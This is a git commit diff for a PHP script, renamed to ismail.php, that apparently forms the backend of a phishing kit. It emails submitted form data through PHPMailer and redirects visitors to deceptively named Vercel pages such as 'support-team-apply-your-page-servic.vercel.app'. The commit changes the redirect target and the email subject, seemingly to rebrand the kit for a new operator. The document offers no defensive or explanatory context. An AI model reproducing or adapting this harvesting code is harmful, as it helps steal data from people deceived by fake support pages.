c576433c160fe553a9802d7e255939eab4e6e051
mhussainofficial03 <mhussain.official03@gmail.com>
2025-08-13 07:14:50 +0800

    Update and rename md.php to ismail.php

--- ismail.php
+++ ismail.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://applying-submit-here-team-request.vercel.app/");
+header("Location: https://support-team-apply-your-page-servic.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
@@ -43,7 +43,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'MD';
+        $mail->Subject = 'ISMAIL';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
         // Send email
